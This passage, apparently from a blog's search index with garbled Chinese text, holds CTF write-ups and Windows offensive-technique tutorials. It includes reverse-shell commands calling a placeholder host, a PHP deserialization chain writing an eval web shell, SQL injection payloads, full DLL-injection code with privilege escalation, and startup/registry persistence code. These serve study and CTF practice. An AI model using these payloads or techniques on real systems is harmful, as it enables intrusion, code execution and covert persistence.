die('&lt;h2&gt;'.'&lt;hacker&gt;'.'&lt;h2&gt;'.'&lt;br&gt;'.'&lt;h1&gt;'.'404'.'&lt;h1&gt;'.'&lt;br&gt;'.'Sorry, only people from GWHT are allowed to access this website.'.'23333'); } ?&gt; &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt; &lt;form&gt; &lt;input type=&quot;hidden&quot; value=&quot;GWHT.php&quot; name=&quot;file&quot;&gt; &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;?php if (isset($_GET[&quot;count&quot;])) { $count = $_GET[&quot;count&quot;]; if(preg_match('/;|base64|rot13|base32|base16|&lt;\\?php|#/i', $count)){ die('hacker!'); } echo &quot;&lt;h2&gt;The Count is: &quot; . exec('printf \\'' . $count . '\\' | wc -c') . &quot;&lt;/h2&gt;&quot;; } ?&gt;&lt;/body&gt;&lt;/html&gt; è¯»å–check.php 1234567&lt;?php$pass = &quot;GWHT&quot;;// Cookie password.echo &quot;Here is nothing, isn't it ?&quot;;header('Location: /'); åå¼¹shell 1curl http://x.x.x.x/qwzf|bash qwzfæ–‡ä»¶å†…å®¹ 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/12345 0&gt;&amp;1 åœ¨envä¸­æ‰¾åˆ°flag EasySeræºç ä¸­æœ‰æç¤ºè®¿é—®ser.php ssrfè¯»å–ser.php 1http://1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn/star1.php/star1.php?path=http%3A%2F%2F127.0.0.1%2Fser.php file_put_contentsæ–¹æ³•å¯ä»¥è¢«åˆ©ç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041 &lt;?phperror_reporting(0);if ( $_SERVER['REMOTE_ADDR'] == &quot;127.0.0.1&quot; ) { highlight_file(__FILE__);} $flag='{Trump_:&quot;fake_news!&quot;}';class GWHT{ public $hero; public function __construct(){ $this-&gt;hero = new Yasuo; } public function __toString(){ if (isset($this-&gt;hero)){ return $this-&gt;hero-&gt;hasaki(); }else{ return &quot;You don't look very happy&quot;; } }}class Yongen{ //flag.php public $file; public $text; public function __construct($file='',$text='') { $this -&gt; file = $file; $this -&gt; text = $text; } public function hasaki(){ $d = '&lt;?php die(&quot;nononon&quot;);?&gt;'; $a= $d. $this-&gt;text; @file_put_contents($this-&gt; file,$a); }}class Yasuo{ public function hasaki(){ return &quot;I'm the best happy windy man&quot;; }}?&gt; æ„é€ expï¼Œè¿™é‡Œç”¨php://filterç»•è¿‡æ‹¼æ¥çš„&lt;?php die(&quot;nononon&quot;);?&gt; 1234567891011121314151617&lt;?phpclass GWHT{ public $hero; public function __construct() { $this-&gt;hero=new Yongen(); }}class Yongen{ //flag.php public $file = &quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;; public $text = &quot;aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;;}$a = new GWHT;echo urlencode(serialize($a)); æ„é€ ssrfè¯·æ±‚è§¦å‘ååºåˆ—åŒ– 1http://1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn/star1.php/star1.php?path=http://127.0.0.1/ser.php&amp;c=O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A35%3A%22aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%22%3B%7D%7D æˆåŠŸå†™å…¥æ–‡ä»¶ï¼Œå¾—åˆ°flag","link":"/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/"},{"title":"è¿œç¨‹çº¿ç¨‹æ³¨å…¥DLL","text":"åŸç†åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹çš„å†…å­˜ç©ºé—´éƒ½æ˜¯è¢«éš”ç¦»çš„ï¼Œä½†æ˜¯æŸäº›æ—¶å€™éœ€è¦ä¸¤ä¸ªè¿›ç¨‹åè°ƒå·¥ä½œæˆ–è€…æ˜¯è·¨è¿›ç¨‹æ“ä½œã€‚â€œè¿œç¨‹çº¿ç¨‹â€æ„æ€æ˜¯è·¨è¿›ç¨‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¿›ç¨‹Aåœ¨è¿›ç¨‹Bä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™å°±å«è¿œç¨‹çº¿ç¨‹ã€‚ DLLæ–‡ä»¶åŠ è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ï¼Œä¸ä¼šæœ‰è¿›ç¨‹åï¼Œéšè”½æ€§è¾ƒå¥½ï¼Œæ–¹æ³•æ˜¯å¼ºåˆ¶è®©æŸè¿›ç¨‹åŠ è½½DLLæ–‡ä»¶ã€‚åªè¦æœ‰è¿›ç¨‹PIDï¼Œå…ˆé€šè¿‡OpenProcessè·å–è¯¥è¿›ç¨‹å¥æŸ„ï¼Œå†ä½¿ç”¨CreateRemoteThreadã€‚æ¯ä¸ªè¿›ç¨‹åœ°å€ç©ºé—´éš”ç¦»ï¼Œæ–°åˆ›å»ºçš„çº¿ç¨‹å‡½æ•°åœ°å€ä¹Ÿåº”è¯¥åœ¨ç›®çš„è¿›ç¨‹ä¸­ï¼Œè€Œä¸åº”è¯¥åœ¨æœ¬è¿›ç¨‹ä¸­ï¼ŒåŒæ ·ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•°ä¹Ÿåº”è¯¥åœ¨ç›®çš„è¿›ç¨‹ä¸­ï¼ŒThreadProcä¸LoadLibraryé™¤äº†è¿”å›å€¼ä»¥å¤–åŸºæœ¬ç›¸åŒï¼Œè¿”å›å€¼çš„é—®é¢˜å¯ä»¥ä¸è€ƒè™‘ã€‚ç›´æ¥æŠŠLoadLibraryå‡½æ•°ä½œä¸ºçº¿ç¨‹å‡½æ•°åˆ›å»ºåˆ°æŒ‡å®šè¿›ç¨‹ä¸­ã€‚ LoadLibraryå‡½æ•°åœ¨Kernerl32.dllè¿™ä¸ªç³»ç»Ÿdllä¸­ï¼Œè€ŒKernerl32è¿™ä¸ªDLLæ–‡ä»¶åœ¨ä»»ä½•è¿›ç¨‹ä¸­çš„åŠ è½½ä½ç½®éƒ½ç›¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´LoadLibraryå‡½æ•°çš„åœ°å€åœ¨ä»»ä½•è¿›ç¨‹ä¸­çš„åœ°å€éƒ½ç›¸åŒï¼Œå› æ­¤åªè¦åœ¨è¿›ç¨‹ä¸­è·å–LoadLibrayå‡½æ•°åœ°å€åï¼Œè¯¥åœ°å€åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ä¹Ÿå¯ä»¥ç”¨ã€‚ä½¿ç”¨WriteProcessMemoryæŠŠè¦æ³¨å…¥çš„DLLæ–‡ä»¶å†™å…¥ç›®æ ‡è¿›ç¨‹ï¼Œè¯¥å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°éœ€è¦ç”¨VirtualAllocExåœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€å—å†…å­˜ï¼Œç„¶åå†™å…¥dllæ–‡ä»¶è·¯å¾„ å®ç°è¿‡ç¨‹åŸç†ï¼šå…ˆè·å–è¿›ç¨‹å¥æŸ„ï¼ˆOpenProcessï¼‰-&gt;åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€å—å®¹çº³dllæ–‡ä»¶è·¯å¾„åçš„å†…å­˜ï¼ˆVirtualAllocExï¼‰å¹¶å†™å…¥dllè·¯å¾„åï¼ˆWriteProcessMemoryï¼‰-&gt;ä»Kernel32.dllä¸­è·å–LoadLibraryAå‡½æ•°çš„åœ°å€(GetProcAddresså‡½æ•°)-&gt;åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼ˆCreateRemoteThreadï¼‰ï¼ŒæŠŠçº¿ç¨‹å‡½æ•°åœ°å€(ThreadProc)æ›¿æ¢ä¸ºä»Kernel32.dllä¸­è·å–çš„LoadLibraryåœ°å€åŠ è½½æ¶æ„dll è°ƒæ•´è¿›ç¨‹æƒé™å½“å‰è¿›ç¨‹æƒé™çº§åˆ«ä¸å¤Ÿæ—¶ï¼Œç”¨OpenProcess()å‡½æ•°æ‰“å¼€å¦‚smss.exeï¼Œwinlogon.exeç­‰ç³»ç»Ÿè¿›ç¨‹æ—¶åŒæ ·ä¼šå¤±è´¥ï¼Œéœ€è¦è°ƒæ•´å½“å‰è¿›ç¨‹ä¸ºâ€SeDebugPrivilegeâ€æƒé™ã€‚ è°ƒæ•´æƒé™3ä¸ªæ­¥éª¤ï¼Œè°ƒæ•´æƒé™ä½¿å½“å‰è¿›ç¨‹æ‹¥æœ‰â€SeDebugPrivilegeâ€æƒé™ï¼Œæ‹¥æœ‰è¿™ä¸ªæƒé™åï¼Œå½“å‰è¿›ç¨‹å¯ä»¥è®¿é—®ä¸€äº›å—é™çš„ç³»ç»Ÿèµ„æºã€‚ ï¼ˆ1ï¼‰ä½¿ç”¨OpenProcessTokenå‡½æ•°æ‰“å¼€å½“å‰è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œ ï¼ˆ2ï¼‰ä½¿ç”¨LookupPrivilegeValue()å‡½æ•°å–å¾—æè¿°æƒé™çš„LUID ï¼ˆ3ï¼‰ä½¿ç”¨AdjustTokenPrivileges()å‡½æ•°è°ƒæ•´è®¿é—®ä»¤ç‰Œçš„æƒé™ã€‚ è°ƒæ•´æƒé™ä»£ç  1234567891011121314151617181920212223242526bool AdjustProcessTokenPrivilege(){ LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))//ä½¿ç”¨OpenProcessTokenå‡½æ•°æ‰“å¼€å½“å‰è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œ return false; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidTmp))//ä½¿ç”¨LookupPrivilegeValue()å‡½æ•°å–å¾—æè¿°æƒé™çš„LUID { CloseHandle(hToken); return FALSE; } tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))//ä½¿ç”¨AdjustTokenPrivileges()å‡½æ•°è°ƒæ•´è®¿é—®ä»¤ç‰Œçš„æƒé™ã€‚ { CloseHandle(hToken); return FALSE; } return true;} ç›¸å…³APIå‡½æ•°OpenProcessæœ‰äº†è¿›ç¨‹IDåï¼Œç”¨æ­¤å‡½æ•°è·å¾—è¿›ç¨‹å¥æŸ„ï¼Œè¿”å›å€¼ä¸ºè¿›ç¨‹çš„å¥æŸ„ï¼Œé€šè¿‡æ­¤å¥æŸ„å¯ç»“æŸè¿›ç¨‹ 12345HANDLE OpenProcess( DWORD dwDesiredAccess,//è¿›ç¨‹æƒ³è¦å–å¾—çš„è®¿é—®æƒé™ï¼ŒPROCESS_ALL_ACCESS BOOL bInheritHandle,//è·å–çš„å¥æŸ„æ˜¯å¦å¯ç»§æ‰¿ï¼Œä¸€èˆ¬FALSE DWORD dwProcessId//è¦æ‰“å¼€çš„è¿›ç¨‹IDå·); GetProcAddressæˆåŠŸè¿”å›å¯¼å‡ºå‡½æ•°æˆ–å˜é‡çš„åœ°å€,å¤±è´¥è¿”å›NULL 1234FARPROC GetProcAddress( HMODULE hModule,//LoadLibraryè¿”å›å¥æŸ„ LPCSTR lpProcName//æŒ‡å®šè¦è·å–å‡½æ•°åœ°å€çš„å‡½æ•°); CreateRemoteThreadåŠŸèƒ½ä¸ºåˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œç›¸æ¯”CreateThreadå¤šäº†ä¸€ä¸ªhProcesså‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å®šè¦åˆ›å»ºçº¿ç¨‹çš„è¿›ç¨‹å¥æŸ„ã€‚CreateThreadä¹Ÿæ˜¯ä¾èµ–äºCreateRemoteThreadï¼Œä¸¤ä¸ªå‡½æ•°éƒ½å¿…é¡»ä¼ å…¥çº¿ç¨‹å‡½æ•°å‚æ•°ï¼ˆThreadProcï¼‰ã€‚è¿™é‡Œéœ€è¦ç»™lpStartAddresså‡½æ•°ä¼ å…¥LoadLibraryAçš„åœ°å€æ›¿ä»£åŸæ¥è°ƒç”¨çš„çº¿ç¨‹å‡½æ•°ï¼ŒLoadLibraryé€šè¿‡GetProcAddresså‡½æ•°ä»Kernel32.dllä¸­è·å–ã€‚ 123456789HANDLE CreateRemoteThread( HANDLE hProcess,//OpenProcessæ‰“å¼€çš„çº¿ç¨‹å¥æŸ„ LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,//çº¿ç¨‹å‡½æ•°åœ°å€ï¼Œä¼ å…¥LoadLibraryï¼Œè¯¥å‡½æ•°åœ°å€ä½äºKernel32.dllï¼Œæ¯ä¸ªè¿›ç¨‹ä¸­éƒ½å›ºå®šï¼ŒGetProcAddressè·å– LPVOID lpParameter,//ä¼ ç»™çº¿ç¨‹å‡½æ•°å‚æ•° DWORD dwCreationFlags, LPDWORD lpThreadId); VirtualAllocExåœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€å—å†…å­˜,è¿”å›ç›®æ ‡è¿›ç¨‹ç”³è¯·åˆ°çš„å†…å­˜å—çš„èµ·å§‹åœ°å€ 1234567LPVOID VirtualAllocEx( HANDLE hProcess,//æŒ‡å®šè¦ç”³è¯·å†…å­˜çš„è¿›ç¨‹å¥æŸ„ LPVOID lpAddress,//æŒ‡å®šç”³è¯·çš„èµ·å§‹ä½ç½® NULL SIZE_T dwSize,//æŒ‡å®šç”³è¯·å†…å­˜çš„é•¿åº¦ å¡«å…¥ç”³è¯·å†…å­˜å¤§å°ï¼Œä¸ºdllè·¯å¾„çš„å¤§å° DWORD flAllocationType,//æŒ‡å®šç”³è¯·å†…å­˜çš„çŠ¶æ€ç±»å‹ DWORD flProtect//æŒ‡å®šç”³è¯·å†…å­˜çš„å†…å­˜å±æ€§); WriteProcessMemoryæŠŠlpBufferä¸­çš„å†…å®¹å†™åˆ°hProcessæŒ‡å®šè¿›ç¨‹ä¸­çš„lpBaseAddressï¼Œä½¿ç”¨WriteProcessMemoryæŠŠè¦æ³¨å…¥çš„DLLæ–‡ä»¶è·¯å¾„å†™å…¥ç›®æ ‡è¿›ç¨‹ 1234567BOOL WriteProcessMemory( HANDLE hProcess,//æŒ‡å®šè¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„ LPVOID lpBaseAddress,//æŒ‡å®šå†™å…¥å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå…ˆç”¨virtualAllocexåœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·å†…å­˜ï¼Œç„¶åå†™å…¥dllæ–‡ä»¶è·¯å¾„ LPCVOID lpBuffer,//æŒ‡å®šå†™å…¥å†…å®¹çš„ç¼“å†²åŒº SIZE_T nSize,//å†™å…¥å†…å®¹é•¿åº¦ SIZE_T *lpNumberOfBytesWritten//æ¥æ”¶å®é™…å†™å…¥å†…å®¹é•¿åº¦); CloseHandleå¯¹æ‰“å¼€çš„å¥æŸ„è¿›è¡Œå…³é—­é‡Šæ”¾èµ„æº 123BOOL CloseHandle( HANDLE hObject); ä»£ç æ¶æ„dllä»£ç ï¼ŒåŠŸèƒ½ä¸ºå¼¹å‡ºMessageBox 123456789101112131415161718192021222324// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;pch.h&quot;#include &lt;tchar.h&gt;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: MessageBox(NULL, _T(&quot;Dll Injected&quot;), _T(&quot;tips&quot;), MB_OK); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} æ³¨å…¥ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;stdlib.h&gt;#include&lt;Tlhelp32.h.&gt;#include&lt;tchar.h&gt;//æå‡æƒé™ä»£ç BOOL AdjustProcessTokenPrivilege(){ LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) return false; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidTmp)) { CloseHandle(hToken); return FALSE; } tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) { CloseHandle(hToken); return FALSE; } return true;}BOOL LoadDll(DWORD dwProcessID, char* szDllPathName){ // #0.æå‡è¿›ç¨‹ä¸ºDEBUGæƒé™ if (!AdjustProcessTokenPrivilege()) { printf(&quot;ææƒå¤±è´¥\\n&quot;); return 0; } //è·å–è¿›ç¨‹å¥æŸ„ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID); if (hProcess == NULL) { printf(&quot;OPENPROCESS Error ! \\n&quot;); return FALSE; } //åœ¨ç›®æ ‡è¿›ç¨‹åˆ†é…å†…å­˜å¹¶å†™å…¥dllè·¯å¾„å LPVOID lpAllocAddr = VirtualAllocEx(hProcess, NULL, strlen(szDllPathName) + 1, MEM_COMMIT, PAGE_READWRITE); if (lpAllocAddr == NULL) { printf(&quot;VIRTUALALLOCEX Error ! \\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, strlen(szDllPathName) + 1, NULL); if (!bRet) { printf(&quot;WriteProcessMemory Error ! \\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } //è·å–LoadLibraryA å‡½æ•°åœ°å€ FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(&quot;kernel32.dll&quot;)), &quot;LoadLibraryA&quot;); if (!dwLoadAddr) { printf(&quot;GetProcAddress Error !\\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } //åˆ›å»ºè¿œç¨‹çº¿ç¨‹,åŠ è½½dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, 0, NULL); if (!hThread) { printf(&quot;CreatRemoteTread Error !\\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } CloseHandle(hProcess); return TRUE;}int main(){ LoadDll(25028, (char*)&quot;C:\\\\Users\\\\Administrator\\\\source\\\\repos\\\\Project8\\\\Project8\\\\DllTest.dll&quot;); return 0;} é€‰æ‹©PIDä¸º25028çš„è¿›ç¨‹è¿›è¡Œæ³¨å…¥ æ³¨å…¥æˆåŠŸï¼Œå¼¹å‡ºMessageBox","link":"/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/"},{"title":"é€šè¿‡æ·»åŠ å¯åŠ¨ç›®å½•å’Œå’Œä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæƒé™ç»´æŒ","text":"æ·»åŠ å¯åŠ¨ç›®å½•ç”±äºå¯åŠ¨ç›®å½•ä¸å›ºå®šï¼Œéœ€è¦å…ˆé€šè¿‡SHGetSpecialFolderPathè·å–å¯åŠ¨è·¯å¾„ï¼Œå†CopyFileæŠŠè¦è‡ªå¯åŠ¨çš„ç¨‹åºå¤åˆ¶è¿‡å» 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;shlobj_core.h&gt;int main(){ wchar_t StartupFolder[MAX_PATH] = {0}; wchar_t Path[MAX_PATH] = { 0 }; BOOL bRet= SHGetSpecialFolderPath(NULL, StartupFolder, CSIDL_STARTUP, FALSE); if (!bRet) { return -1; } GetModuleFileName(NULL, (LPWSTR)&amp;Path, MAX_PATH); wcscat_s(StartupFolder, L&quot;\\\\Persistance.exe&quot;); MessageBox(NULL, StartupFolder, L&quot;StartupFolder&quot;, MB_OK); if (CopyFile(Path, StartupFolder, FALSE)) { MessageBox(NULL, L&quot;succeed&quot;, L&quot;succeed&quot;, MB_OK); } return 0;} ä¿®æ”¹æ³¨å†Œè¡¨æ— éœ€ç®¡ç†å‘˜æƒé™å³å¯ä¿®æ”¹HKEY_CURRENT_USER åœ¨HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runä¸­å†™å…¥ç¨‹åºè·¯å¾„å³å¯å®ç°å¼€æœºè‡ªå¯åŠ¨ ä»£ç 12345678910111213141516171819202122232425262728293031//æ·»åŠ è‡ªèº«åˆ°æ³¨å†Œè¡¨å¯åŠ¨é¡¹BOOL Regpersist(){ HKEY hKey; LPCTSTR szRun = _T(&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;); if (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, 0, KEY_ALL_ACCESS, &amp;hKey) == ERROR_SUCCESS) { TCHAR szFileName[MAX_PATH] = { 0 }; DWORD dwRet = GetModuleFileName(NULL, szFileName, MAX_PATH); AfxMessageBox(szFileName); long lRet = RegSetValueEx(hKey, _T(&quot;Login&quot;), 0, REG_SZ, (BYTE*)szFileName, dwRet); RegCloseKey(hKey); if (lRet != ERROR_SUCCESS) return FALSE; //else // åˆ é™¤å¯åŠ¨; //{ // long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;); // RegCloseKey(hKey); // if (lRet != ERROR_SUCCESS) // return FALSE; //} } else { MessageBox(_T(&quot;æ‰“å¼€æ³¨å†Œè¡¨å¤±è´¥&quot;)); return FALSE; } MessageBox(_T(&quot;æ·»åŠ æˆåŠŸ&quot;)); return TRUE;} ç›¸å…³APIå‡½æ•°SHGetSpecialFolderPathè¯¥apiç”¨æ¥è·å–æŒ‡å®šçš„ç³»ç»Ÿè·¯å¾„ 123456BOOL SHGetSpecialFolderPathA( HWND hwnd, LPSTR pszPath, int csidl, //CSIDL_STARTUP BOOL fCreate); RegOpenKeyæ‰“å¼€æ³¨å†Œè¡¨ï¼ŒæˆåŠŸè¿”å›ERROR_SUCCESS 12345LSTATUS RegOpenKeyA( HKEY hKey, //æŒ‡å®šä¸€ä¸ªçˆ¶é”®å¥æŸ„ HKEY_CURRENT_USER LPCSTR lpSubKey,//æŒ‡å‘ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¦æ‰“å¼€çš„å­é”®åç§°,_T(&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;) PHKEY phkResult//è¿”å›æ‰“å¼€çš„å­é”®å¥æŸ„ &amp;hKey); RegCloseKeyå…³é—­æ³¨å†Œè¡¨ï¼ŒæˆåŠŸè¿”å›ERROR_SUCCESS 123LSTATUS RegCloseKey( HKEY hKey//æ‰“å¼€çš„å­é”®å¥æŸ„); RegQueryValueExæ³¨å†Œè¡¨é”®å€¼çš„æŸ¥è¯¢ æˆåŠŸè¿”å› ERROR_SUCCESS. 12345678LSTATUS RegQueryValueExA( HKEY hKey,//æŒ‡å‘ä¸€ä¸ªå·²ç»è¢«æ‰“å¼€æˆ–åˆ›å»ºçš„å­é”®å¥æŸ„ LPCSTR lpValueName,//æŒ‡å®šè¦è¢«æŸ¥è¯¢çš„é”®å€¼çš„åç§° LPDWORD lpReserved,//ä¿ç•™ï¼Œå§‹ç»ˆNULL LPDWORD lpType,//è¿”å›è¢«æŸ¥è¯¢çš„å€¼çš„ç±»å‹ LPBYTE lpData,//è¿”å›è¢«æŸ¥è¯¢æ•°æ®çš„ç¼“å†²åŒº LPDWORD lpcbData//ç¼“å†²åŒºé•¿åº¦); RegSetValueExæ³¨å†Œè¡¨é”®å€¼çš„å†™å…¥ æˆåŠŸè¿”å› ERROR_SUCCESS. 12345678LSTATUS RegSetValueExA( HKEY hKey,//æŒ‡å‘ä¸€ä¸ªå·²ç»è¢«æ‰“å¼€æˆ–åˆ›å»ºçš„å­é”®å¥æŸ„ HKEY_LOCAL LPCSTR lpValueName,//æŒ‡å®šè¦è¢«æŸ¥è¯¢æˆ–å†™å…¥çš„é”®å€¼çš„åç§° MFCLogin DWORD Reserved,//ä¿ç•™ï¼Œå§‹ç»ˆä¸º0 0 DWORD dwType,//å†™å…¥é”®å€¼çš„ç±»å‹ REG_SZ const BYTE *lpData,//å†™å…¥é”®å€¼çš„ç¼“å†²åŒº è·¯å¾„ DWORD cbData//å†™å…¥é”®å€¼ç¼“å†²åŒºçš„é•¿åº¦ sizeof); RegEnumValueæ³¨å†Œè¡¨é”®å€¼çš„æšä¸¾ æˆåŠŸè¿”å› ERROR_SUCCESS. 12345678910LSTATUS RegEnumValueA( HKEY hKey,//æŒ‡å‘ä¸€ä¸ªå·²ç»è¢«æ‰“å¼€æˆ–åˆ›å»ºçš„å­é”®å¥æŸ„ DWORD dwIndex,//æŸ¥è¯¢çš„ç´¢å¼•å€¼ LPSTR lpValueName,//å¥åçš„ç¼“å†²åŒº LPDWORD lpcchValueName,//å¥åç¼“å†²åŒºçš„é•¿åº¦ LPDWORD lpReserved,//ä¿ç•™ï¼ŒNULL LPDWORD lpType,//è¿”å›è¢«æŸ¥è¯¢çš„å€¼çš„ç±»å‹ LPBYTE lpData,//è¢«æŸ¥è¯¢é”®å€¼çš„ç¼“å†²åŒº LPDWORD lpcbData//è¢«æŸ¥è¯¢é”®å€¼çš„ç¼“å†²åŒºçš„å¤§å°); RegDeleteValueæ³¨å†Œè¡¨é”®å€¼çš„åˆ é™¤ æˆåŠŸè¿”å› ERROR_SUCCESS. 1234LSTATUS RegDeleteValueA( HKEY hKey,//æŒ‡å‘ä¸€ä¸ªå·²ç»è¢«æ‰“å¼€æˆ–åˆ›å»ºçš„å­é”®å¥æŸ„ LPCSTR lpValueName//æŒ‡å‘æ¬²åˆ é™¤çš„é”®å€¼é¡¹çš„åç§°); GetModuleFileNameåœ¨å¼€å‘è¿‡ç¨‹ä¸­ç»å¸¸éœ€è¦è·å¾—ç¨‹åºå½“å‰çš„è¿è¡Œç›®å½•ï¼Œè¿™æ—¶å°±å¯ä»¥ä½¿ç”¨GetModuleFileName 12345DWORD WINAPI GetModuleFileName( HMODULE hModule,//è¦è·å–æ–‡ä»¶åçš„æ¨¡å—åæŸ„,nullè¡¨ç¤ºå½“å‰æ¨¡å— LPTSTR lpFileName,//è¾“å‡ºå‚æ•°ï¼Œå­˜æ”¾å–å¾—çš„æ–‡ä»¶å TCHAR lpfilename DWORD nSize//å‚æ•°çš„é•¿åº¦ MAX_PATH);","link":"/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"title":"CISCN2021 webéƒ¨åˆ†é¢˜è§£","text":"easy_sqlåˆ©ç”¨joinè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼Œå…ˆå¾—åˆ°ç¬¬ä¸€ä¸ªåˆ—åä¸ºid 1uname=1mm1') and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c)),0)%23&amp;passwd=11&amp;Submit=%E7%99%BB%E5%BD%95 ç»§ç»­è¯»å–ç¬¬ä¸‰ä¸ªåˆ—å 1uname=1mm1') and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c)),0)%23&amp;passwd=11&amp;Submit=%E7%99%BB%E5%BD%95 è¯»å–flag 1uname=1mm1') and updatexml(1,concat(0x7e,(select group_concat(`bac9c1a9-327a-4da1-9d66-cbc840b139a4`) from flag)),0)%23&amp;passwd=11&amp;Submit=%E7%99%BB%E5%BD%95 easy_sourceè®¿é—®.index.php.swoå¾—åˆ°éƒ¨åˆ†æºç ï¼Œphpå†…ç½®ç±»ååºåˆ—åŒ–ï¼Œæ ¹æ®æç¤ºçŒœåˆ°flagå¯èƒ½åœ¨æ³¨é‡Šé‡Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113&lt;?phpclass User{ private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return 